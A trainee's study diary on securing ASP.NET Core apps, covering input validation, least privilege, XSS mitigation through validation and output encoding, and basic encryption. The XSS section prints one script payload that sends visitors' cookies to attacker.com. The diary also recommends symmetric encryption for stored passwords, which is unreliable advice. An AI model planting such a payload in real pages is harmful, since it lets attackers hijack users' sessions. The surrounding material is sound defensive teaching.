# Day 29: Web Security, XSS Defense & Practical Data Encryption

Hello! This is my Wipro trainee study diary for Day 29. Today we analyzed the key strategies to secure our ASP.NET Core applications against client-side script hijacking (XSS) and cross-site forgery (CSRF), and reviewed the core pillars of modern web cryptography.

---

## Core Security Golden Rules

In our training today, we established three primary operational guidelines that every enterprise ASP.NET Core application must enforce:

### 1. Trust No Input
* **The Rule:** Treat every piece of data coming from the browser (forms, cookies, headers, query parameters) as potentially malicious. 
* **The Practice:** Apply strict validation rules using Data Annotations (like length limits and regular expression filters) to enforce a robust schema. Never print raw, un-encoded input values back to the browser; perform output encoding to render scripts harmless.

### 2. Keep Frameworks Current
* **The Rule:** Software platforms are updated constantly to resolve newly discovered system exploits.
* **The Practice:** Regularly execute NuGet package updates to keep all third-party libraries current, and run the latest .NET SDK runtime to patch underlying framework-level security bugs.

### 3. Principle of Least Privilege
* **The Rule:** Limit the capabilities of your application's database account to the minimum set required for business execution.
* **The Practice:** Your Web API's SQL Server connection string should map to a user account that only has SELECT, INSERT, UPDATE, and DELETE rights. Eliminate structural administration capabilities like `DROP TABLE` or `ALTER SCHEMA` from this account so that a compromised app cannot destroy database definitions.

---

## Mitigating Customer Portal Vulnerability Risks

During our sandbox review, we analyzed a standard customer comment form that saved inputs directly without validation and printed them raw to other users' dashboards.

### The Vulnerability: Cross-Site Scripting (XSS)
* If an unconstrained input textbox accepts any string, an attacker can submit a malicious script snippet:
  ```html
  <script>window.location='http://attacker.com/steal?cookie=' + document.cookie;</script>
  ```
* When other users visit the comments page, their browsers download this comment and execute the script implicitly. This instantly leaks their session authentication cookies, allowing the attacker to hijack their logged-in profiles.

### The Mitigation Strategy
We completely eliminated this data injection vulnerability using a two-tier defense:
1. **Server-Side Strict Validation:** Inside [FeedbackPortal_SourceCode.cs](file:///c:/Users/livel/Desktop/Wipro%20main/Wipro-Training-2026/Module-06-Web-API%20&%20Microservices/Day-29-WebSecurity-FeedbackPortal/FeedbackPortal_SourceCode.cs), we test `!ModelState.IsValid`. The name input is bound to a strict regular expression filter mapping `^[a-zA-Z\s]+$`, meaning any special character (like `<` or `>`) immediately triggers a validation failure, blocking the comment from reaching our backend.
2. **Explicit Output HTML Encoding:** When rendering strings in our display view, Razor view expressions automatically perform output encoding. pasting a script tag converts the raw characters into harmless HTML entities (e.g., `<` becomes `&lt;` and `>` becomes `&gt;`). The browser prints the script as plain readable text instead of executing it.

---

## Web Cryptography Foundations

When saving data or securing pipelines, we rely on core encryption methods:

### Asymmetric (Public/Private Key) Encryption
* **How it works:** Uses a mathematically linked pair of keys—a **Public Key** and a **Private Key**.
* **Usage:** Anyone can use the public key to encrypt data, but only the holder of the secure private key can decrypt it. It is commonly used to establish secure handshake routes over public networks (such as HTTPS/TLS).

### Symmetric (Single Key) Encryption
* **How it works:** Uses a single, shared secret key to both encrypt and decrypt data (like AES-256).
* **Usage:** Extremely fast and highly secure. It is the industry-standard approach for saving highly sensitive database rows (like encrypted credit cards or passwords) where the application is the sole entity reading and writing the values.

---

## Encryption Best Practices

* **Never Hardcode Secrets:** Never write private keys or database passwords directly inside C# files or public config files (`appsettings.json`).
* **Secret Rotation:** Configure processes to rotate keys and secret hashes frequently to reduce the window of opportunity for cracked credentials.
* **Environmental Containers:** Leverage secure environmental secret vaults (such as Azure Key Vault or AWS Secrets Manager) to inject keys into memory dynamically at runtime.
